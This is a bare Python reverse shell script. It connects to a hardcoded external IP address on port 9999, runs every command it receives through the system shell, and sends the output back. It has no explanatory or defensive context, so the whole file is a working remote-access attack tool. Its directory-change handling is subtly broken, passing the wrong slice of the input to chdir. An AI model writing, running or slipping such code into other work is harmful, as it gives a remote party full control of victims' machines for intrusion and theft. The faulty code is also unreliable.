import socket
import os
import subprocess

c=socket.socket()
host="13.232.15.144"
port=9999
c.connect((host,port))
while True:
    data=c.recv(1024)
    if data[:2].decode("utf-8") =="cd":
        os.chdir(data[:3].decode("utf-8"))

    if len(data)>0:
        cmd=subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte=cmd.stdout.read()+cmd.stderr.read()
        output_string=str(output_byte,"utf-8")

        c.send(str.encode(output_string))
        print(output_string)
